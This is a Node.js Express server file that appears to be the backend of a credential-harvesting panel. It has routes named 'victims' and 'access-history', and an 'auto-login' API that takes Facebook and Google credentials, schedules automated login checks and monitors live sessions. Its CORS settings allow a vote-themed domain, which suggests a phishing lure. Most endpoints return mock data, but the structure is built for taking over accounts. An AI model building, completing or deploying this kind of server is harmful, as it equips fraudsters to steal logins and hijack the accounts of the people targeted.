/**
 * Enhanced Backend Server - Optimized API with Enhanced Routes
 * Server backend nâng cấp với đầy đủ routes và enhanced features
 */

import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";
import cors from "cors";
import helmet from "helmet";
import dotenv from "dotenv";

// Import API routes
import autoLoginRoutes from "./routes/autoLogin.js";
import victimsRoutes from "./routes/victims.js";
import accessHistoryRoutes from "./routes/accessHistory.js";
import systemRoutes from "./routes/system.js";
import userFeedbackRoutes from "./routes/userFeedback.js";
import userRoutes from "./routes/user.js";

// Load environment variables
dotenv.config({ path: ".env.production" });

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: {
    origin: [
      "http://localhost:5173",
      "http://localhost:5174",
      "http://localhost:5175",
      "http://localhost:4173",
      "https://programbvote2025.online",
      "http://programbvote2025.online",
    ],
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
    credentials: true,
  },
});

const PORT = process.env.PORT || 4001;

// Security middleware
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        scriptSrc: ["'self'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'", "wss:", "ws:"],
      },
    },
  })
);

// CORS configuration
app.use(
  cors({
    origin: function (origin, callback) {
      const allowedOrigins = [
        "http://localhost:5173",
        "http://localhost:5174",
        "http://localhost:5175",
        "http://localhost:4173",
        "https://programbvote2025.online",
        "http://programbvote2025.online",
      ];

      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error("Not allowed by CORS"));
      }
    },
    credentials: true,
  })
);

// Body parsing middleware
app.use(express.json({ limit: "10mb" }));
app.use(express.urlencoded({ extended: true, limit: "10mb" }));

// Request logging middleware
app.use((req, res, next) => {
  console.log(`📡 ${req.method} ${req.path} - ${new Date().toISOString()}`);
  next();
});

// Health check endpoint
app.get("/api/health", (req, res) => {
  res.json({
    status: "OK",
    timestamp: new Date().toISOString(),
    environment: process.env.NODE_ENV || "development",
    database: "connected",
    server: "enhanced-backend",
    version: "2.0.0",
  });
});

// Mount API routes
app.use("/api/auto-login", autoLoginRoutes);
app.use("/api/victims", victimsRoutes);
app.use("/api/access-history", accessHistoryRoutes);
app.use("/api/system", systemRoutes);
app.use("/api/user-feedback", userFeedbackRoutes);
app.use("/api/user", userRoutes);

console.log("✅ Enhanced API routes mounted:");
console.log("   📡 /api/auto-login/*");
console.log("   👥 /api/victims/*");
console.log("   📝 /api/access-history/*");
console.log("   ⚙️  /api/system/*");
console.log("   💬 /api/user-feedback/*");
console.log("   👤 /api/user/*");

// Enhanced API endpoints for testing
app.get("/api/auto-login/requests", (req, res) => {
  res.json({
    success: true,
    data: [
      {
        id: "req_001",
        platform: "facebook",
        status: "pending",
        createdAt: new Date().toISOString(),
        credentials: { username: "test@example.com" },
      },
      {
        id: "req_002",
        platform: "google",
        status: "completed",
        createdAt: new Date(Date.now() - 3600000).toISOString(),
        credentials: { username: "user@gmail.com" },
      },
    ],
    total: 2,
    message: "Auto login requests retrieved successfully",
  });
});

app.post("/api/auto-login/requests", (req, res) => {
  const { platform, credentials, config } = req.body;

  if (!platform || !credentials) {
    return res.status(400).json({
      success: false,
      error: "Missing required fields: platform and credentials",
    });
  }

  const newRequest = {
    id: `req_${Date.now()}`,
    platform,
    credentials: { username: credentials.username }, // Don't return password
    config: config || {},
    status: "pending",
    createdAt: new Date().toISOString(),
  };

  res.status(201).json({
    success: true,
    data: newRequest,
    message: "Auto login request created successfully",
  });
});

app.get("/api/auto-login/templates", (req, res) => {
  res.json({
    success: true,
    data: [
      {
        id: "tpl_001",
        name: "Facebook Basic Login",
        platform: "facebook",
        category: "basic",
        createdAt: new Date().toISOString(),
      },
      {
        id: "tpl_002",
        name: "Gmail Advanced",
        platform: "gmail",
        category: "advanced",
        createdAt: new Date().toISOString(),
      },
    ],
    total: 2,
  });
});

app.get("/api/auto-login/schedules", (req, res) => {
  res.json({
    success: true,
    data: [
      {
        id: "sch_001",
        name: "Daily Facebook Check",
        cronExpression: "0 9 * * *",
        isEnabled: true,
        createdAt: new Date().toISOString(),
      },
    ],
    total: 1,
  });
});

app.get("/api/auto-login/monitoring", (req, res) => {
  res.json({
    success: true,
    data: {
      activeSessions: 3,
      completedToday: 12,
      successRate: 87.5,
      avgResponseTime: 2.3,
      liveSessions: [
        {
          id: "session_001",
          platform: "facebook",
          status: "running",
          progress: 65,
          startTime: new Date(Date.now() - 120000).toISOString(),
        },
      ],
    },
  });
});

// Enhanced system routes
app.get("/api/system/connection-test", (req, res) => {
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    server: "enhanced-backend",
    latency: Math.floor(Math.random() * 50) + 10,
    tests: {
      database: { status: "success", latency: 23 },
      redis: { status: "success", latency: 8 },
      external_api: { status: "success", latency: 156 },
    },
  });
});

// Socket.IO setup
io.on("connection", (socket) => {
  console.log(`🔌 Client connected: ${socket.id}`);

  socket.on("request-stats", () => {
    socket.emit("stats", {
      timestamp: new Date().toISOString(),
      connections: {
        adminConnections: 1,
        userConnections: 0,
        totalConnections: 1,
      },
      sync: {
        activeCommands: 0,
        messagesPerMin: 0,
        syncErrors: 0,
        lastSync: new Date().toISOString(),
      },
    });
  });

  socket.on("disconnect", () => {
    console.log(`🔌 Client disconnected: ${socket.id}`);
  });
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error("💥 Server error:", err);
  res.status(500).json({
    success: false,
    error: "Internal server error",
    message: err.message,
    timestamp: new Date().toISOString(),
  });
});

// 404 handler
app.use("*", (req, res) => {
  res.status(404).json({
    success: false,
    error: "Endpoint not found",
    path: req.originalUrl,
    method: req.method,
    timestamp: new Date().toISOString(),
    availableEndpoints: [
      "GET /api/health",
      "GET /api/auto-login/sessions",
      "GET /api/auto-login/requests",
      "POST /api/auto-login/requests",
      "GET /api/auto-login/templates",
      "GET /api/auto-login/schedules",
      "GET /api/auto-login/monitoring",
      "GET /api/system/connection-test",
    ],
  });
});

// Start server
server.listen(PORT, "0.0.0.0", () => {
  console.log("🚀 Enhanced Backend Server Started!");
  console.log(`📍 Server: http://localhost:${PORT}`);
  console.log(`🏥 Health: http://localhost:${PORT}/api/health`);
  console.log(`🤖 Auto Login: http://localhost:${PORT}/api/auto-login/*`);
  console.log(`🔌 WebSocket: Ready for connections`);
  console.log(`⚡ Environment: ${process.env.NODE_ENV || "development"}`);
  console.log("✅ All systems operational!");
});

// Graceful shutdown
process.on("SIGTERM", () => {
  console.log("🛑 SIGTERM received. Shutting down gracefully...");
  server.close(() => {
    console.log("✅ Server closed");
    process.exit(0);
  });
});

process.on("SIGINT", () => {
  console.log("🛑 SIGINT received. Shutting down gracefully...");
  server.close(() => {
    console.log("✅ Server closed");
    process.exit(0);
  });
});

export default app;
